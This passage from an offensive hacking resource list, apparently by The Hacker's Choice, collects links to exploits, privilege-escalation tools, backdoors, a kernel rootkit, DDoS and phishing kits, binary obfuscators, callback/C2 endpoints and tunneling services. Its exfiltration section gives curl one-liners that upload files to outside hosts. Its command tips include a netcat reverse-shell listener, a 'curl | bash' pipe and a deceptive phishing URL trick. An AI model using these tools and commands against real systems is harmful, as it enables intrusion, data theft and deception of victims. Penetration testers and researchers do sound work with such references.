1. [Crypton](https://crypton.sh/) - Rent a private SIM/SMS with crypto ([.onion](http://cryptonx6nsmspsnpicuihgmbbz3qvro4na35od3eht4vojdo7glm6yd.onion/))
2. [List of "No KYC" Services](https://kycnot.me/) ([.onion](http://kycnotmezdiftahfmc34pqbpicxlnx3jbf5p7jypge7gdvduu7i6qjqd.onion/))

OpSec
1. [OpSec for Rebellions](https://medium.com/@hackerschoice/it-security-and-privacy-for-the-rebellions-of-the-world-db4023cadcca) - Start Here. The simplest 3 steps.
1. [RiseUp](https://riseup.net/) - Mail, VPN and Tips for (online) rebellions.
1. [Neko](https://github.com/m1k1o/neko) - Launch Firefox in Docker and access via 127.0.0.1:8080 (WebRTC)
2. [x11Docker](https://github.com/mviereck/x11docker) - Isolate any X11 app in a container (Linux & Windows only). ([Article](https://techviewleo.com/run-gui-applications-in-docker-using-x11docker/?expand_article=1))
3. [DangerZone](https://github.com/freedomofpress/dangerzone) - Make PDFs safe before opening them.
4. [ExifTool](https://exiftool.org/) - Remove meta data from files (`exiftool -all= example.pdf example1.jpg ...`)
5. [EFF](https://www.eff.org/) - Clever advise for freedom figthers.

Exploits
1. [Traitor](https://github.com/liamg/traitor) - Tries various exploits/vulnerabilities to gain root (LPE)
1. [PacketStorm](https://packetstormsecurity.com) - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
1. [ExploitDB](https://www.exploit-db.com) - Also includes metasploit db and google hacking db
1. [Shodan/Exploits](https://exploits.shodan.io/welcome) - Similar to exploit-db

System Information Gathering
1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS - Quick system informations for hackers.
1. https://github.com/zMarch/Orc - Post-exploit tool to find local RCE (type `getexploit` after install)

Backdoors
1. https://www.gsocket.io/deploy - The world's smallest backdoor
1. https://github.com/m0nad/Diamorphine - Linux Kernel Module for hiding processes and files
1. https://www.kali.org/tools/weevely - PHP backdoor

Network Scanners
1. https://github.com/robertdavidgraham/masscan - Scan the entire Internet
1. https://github.com/ptrrkssn/pnscan - Fast network scanner
1. https://zmap.io/ - ZMap & ZGrab

Vulnerability Scanners
1. [Raccoon](https://github.com/evyatarmeged/Raccoon) - Reconnaissance and Information Gathering
1. [Osmedeus](https://github.com/j3ssie/osmedeus) - Vulnerability and Information gathering
1. [FullHunt](https://github.com/fullhunt/) - log4j and spring4shell scanner 

DDoS
1. [DeepNet](https://github.com/the-deepnet/ddos) - we despise DDoS but if we had to then this would be our choice.

Static Binaries / Warez
1. https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
1. https://iq.thc.org/cross-compiling-exploits

Phishing
1. https://github.com/htr-tech/zphisher - We don't hack like this but this is what we would use.
2. https://da.gd/ - Tinier TinyUrl and allows https://www.google.com-fish-fish@da.gd/blah

Tools
1. https://github.com/guitmz/ezuri - Obfuscate Linux binaries
1. https://tmate.io/ - Share A screen with others

Callback / Canary / Command & Control
1. http://dnslog.cn
1. https://app.interactsh.com
1. https://api.telegram.org
1. https://webhook.site

Tunneling
1. [Gost](https://github.com/ginuerzh/gost/blob/master/README_en.md)
1. [TCP Gender Changer](https://tgcd.sourceforge.net/) for all your 'connect back' needs.
1. [ngrok](https://ngrok.com/download), [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps) or [pagekite](https://pagekite.net/) to make a server behind NAT accessible from the public Internet.

Exfil<a id="cloudexfil"></a>
1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l` / `blitz foo.txt`
2. [RedDrop](https://github.com/cyberbutler/RedDrop) - run your own Exfil Server
1. [Mega](https://mega.io/cmd)
2. [oshiAt](https://oshi.at/) - also on TOR. `curl -T foo.txt https://oshi.at`
5. [Transfer.sh](https://transfer.sh/) - `curl -T foo.txt https://transfer.sh`
6. [LitterBox](https://litterbox.catbox.moe/tools.php) - `curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php`  
7. [Croc](https://github.com/schollz/croc) - `croc send foo.txt / croc anit-price-example`
8. [MagicWormhole](https://pypi.org/project/magic-wormhole/)

Publishing
1. [free BT/DC/eD2k seedbox](https://valdikss.org.ru/schare/)
1. Or use /onion on [segfault.net](https://www.thc.org/segfault) or plain old https with ngrok.
1. [DuckDNS](https://www.duckdns.org/) - Free Dynamic Domain Names
3. [afraid.org](https://www.afraid.org) - Free Dynamic DNS for your domain
2. [he.net](https://dns.he.net/) - Free Nameserver service
4. [0bin](https://0bin.net/) / [paste.ec](https://paste.ec) - Encrypted PasteBin

Forums and Conferences
1. [0x00Sec](https://0x00sec.org/) - Reverse Engineering & Hacking with a pinch of Malware
3. [AlligatorCon](https://www.alligatorcon.eu/) - the original
4. [0x41con](https://0x41con.org/)
5. [TumpiCon](https://tumpicon.org/)

Telegram Channels<a id="channels"></a>
1. [The Hacker's Choice](https://t.me/thcorg)
1. [The Hacker News](https://t.me/thehackernews)
1. [CyberSecurity Technologies](https://t.me/CyberSecurityTechnologies)
1. [Offensive Twitter](https://t.me/OffensiveTwitter)
1. [Pwn3rzs](https://t.me/Pwn3rzs)
1. [VX-Underground](https://t.me/vxunderground)
1. [cKure](https://t.me/cKure)
1. [Android Security / Malware](https://t.me/androidMalware)
1. [OSINT CyberDetective](https://t.me/cybdetective)
1. [BookZillaaa](https://t.me/bookzillaaa)

Mindmaps & Knowledge
1. [Compass Sec Cheat Sheets](https://github.com/CompassSecurity/Hacking_Tools_Cheat_Sheet)
1. [Active Directory](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)

<a id="cool-linux-commands"></a>
**12.ii. Cool Linux commands**

1. https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/
1. https://github.com/ibraheemdev/modern-unix

<a id="tmux"></a>
**12.iii. tmux**

| | Tmux Cheat Sheet |
| --- | --- |
| Save Scrollback | ```Ctrl+b``` + ```:```, then type ```capture-pane -S -``` followed by ```Ctrl+b``` + ```:``` and type ```save-buffer filename.txt```. |
| Attach | Start a new tmux, then type ```Ctrl+b``` + ```s``` and use ```LEFT```, ```RIGHT``` to expand and select any session. |
| Logging | ```Ctrl+b``` + ```Shift + P``` to start and stop. |
| Menu | ```Ctrl+b``` + ```>```. Then use ```Ctrl+b``` + ```UP```, ```DOWN```, ```LEFT``` or ```RIGHT``` to move between the panes. |

<a id="useful-commands"></a>
**12.iv. Useful commands**

Use `lsof -Pni` or `netstat -putan` (or `ss -putan`) to list all Internet (_-tu_) connections.

Use `ss -lntp` to show all listening (_-l_) TCP (_-t_) sockets.

Use `netstat -rn` or `ip route show` to show default Internet route.

Use `curl cheat.sh/tar` to get TLDR help for tar. Works with any other linux command.

Use `curl -fsSL bench.sh | bash` to speed test a server.

Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. *rlwrap* comes to the rescue. It buffers all single keystrokes until *Enter* is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...

Example for the receiving end of a revese tunnel:
```sh
rlwrap --always-readline nc -vnlp 1524
```

Example for *SSH*:
```sh
rlwrap --always-readline ssh user@host
```
---
<a id="others"></a>
## 13. Other Sites

1. [Phineas Fisher](https://blog.isosceles.com/phineas-fisher-hacktivism-and-magic-tricks/) - No nonsense. Direct. How we like it.
1. [Hacking HackingTeam - a HackBack](https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0) - Old but real talent at work.
2. [Guacamaya Hackback](https://www.youtube.com/watch?v=5vRIisM0Op4)
3. [Vx Underground](https://www.vx-underground.org/)
4. [HTB absolute](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html) - Well written and explained attack.
5. [Conti Leak](https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak) - Windows hacking. Pragmatic.
6. [Red Team Notes](https://www.ired.team/)
7. [InfoSec CheatSheet](https://github.com/r1cksec/cheatsheets)
8. [HackTricks](https://book.hacktricks.xyz/welcome/readme)
9. [Awesome Red Teaming](https://github.com/yeyintminthuhtut/Awesome-Red-Teaming)
10. [VulHub](https://github.com/vulhub/vulhub) - Test your exploits
11. [Qubes-OS](https://www.qubes-os.org/) - Desktop OS focused on security with XEN isolated (disposable) guest VMs (Fedora, Debian, Whonix out of the box)


---
Shoutz: ADM, subz/#9x, DrWho, spoty
Join us on [Telegram](https://t.me/thcorg).

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/yellow_img.png)](https://www.buymeacoffee.com/hackerschoice)
